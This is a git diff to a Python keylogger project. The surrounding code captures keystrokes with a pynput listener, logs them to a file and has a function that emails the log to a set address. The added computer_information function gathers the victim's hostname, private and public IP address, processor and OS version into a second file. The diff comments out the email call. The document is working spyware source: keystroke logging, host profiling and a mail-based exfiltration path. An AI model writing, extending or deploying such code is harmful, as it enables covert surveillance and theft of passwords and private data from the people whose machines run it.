@@ -36,6 +36,7 @@ from PIL import ImageGrab
 # ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
 # """)
 keys_information = "key_log.txt"
+system_information = "systeminfo.txt"
 
 file_path = "C:\\Users\\user\\Desktop\\Keylogger\\Project"
 extend = "\\"
@@ -50,6 +51,22 @@ word = ""
 
 
 # char_limit = 50
+def computer_information():
+    with open(file_path + extend + system_information, 'a') as f:
+        hostname = socket.gethostname()
+        IPAddr = socket.gethostbyname(hostname)
+        try:
+            public_ip = get("https://api.ipify.org").text
+            f.write("Public IP Address: " + public_ip + "\n")
+        except:
+            f.write("Could not get Public IP Address (most likely max requests made)" + "\n")
+
+        f.write("Processor: " + (platform.processor()) + "\n")
+        f.write("System Information: " + platform.system() + " " + platform.version() + "\n")
+        f.write("Machine Information: " + platform.machine() + "\n")
+        f.write("Hostname: " + hostname + "\n")
+        f.write("Private IP Address: " + IPAddr + "\n")
+
 
 def send_email(filename, attachment, to_addr):
     from_address = email
@@ -108,4 +125,5 @@ def on_release(key):
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
 
-send_email(keys_information, file_path + extend + keys_information, toaddress)
+# send_email(keys_information, file_path + extend + keys_information, toaddress)
+computer_information()
